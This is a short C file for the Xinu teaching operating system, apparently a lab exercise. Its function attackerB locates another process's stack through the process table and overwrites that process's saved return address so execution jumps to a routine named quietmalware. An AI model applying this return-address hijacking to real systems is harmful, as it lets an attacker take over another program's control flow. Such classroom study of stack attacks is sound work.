/* attackerB.c - attackerB */

#include <xinu.h>

/*-------------------------------------------------------------
 * attackerB - attacks a process by changing one of its values
 *------------------------------------------------------------
 */
void attackerB(
    int y /* The number of pids to decrement from currpid */
    )
{
  pid32 victimpid;
  struct procent *prptr;
  long *saddr;
  long retaddr;
  long *ebp;

  /* Obtain the victim ID */
  victimpid  = getpid() - y;

  if (isbadpid(victimpid)) {
    return;
  }

  /* Get the victims stkptr */
  prptr = &proctab[victimpid];
  saddr = (long *) (prptr->prstkptr);

  /* Find the base pointer */
  ebp = saddr + 2;
  saddr = (long *)(*ebp);

  /* Store the original return value and increment saddr */
  retaddr = *++saddr;

  /* Overwrite the return address */
  *saddr = (long) quietmalware;

  /* Store the original return address in %eax */
  saddr = (long *) prptr->prstkptr;

  *(saddr - 1) = retaddr;
}

